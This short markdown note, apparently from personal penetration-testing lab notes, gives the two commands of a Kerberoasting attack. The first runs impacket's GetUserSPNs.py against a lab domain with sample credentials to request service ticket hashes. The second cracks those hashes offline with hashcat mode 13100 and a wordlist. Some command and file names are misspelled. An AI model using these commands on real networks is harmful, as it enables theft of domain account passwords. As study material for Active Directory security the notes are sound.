## GetUserSPNs.py - by impacket
```sh
> GetUseSPNs.py <domain.name/username:password: marvel.local/fcastle:Password1> -dc-ip <myIPAddress: 192.168.57.140> -request 
```

copy the hash in the output and crack hashusing hashcat

```sh
> hashcat -m 13100 <hashfile: hashes4.txt> <passwordlist: rockou.txt> -O
```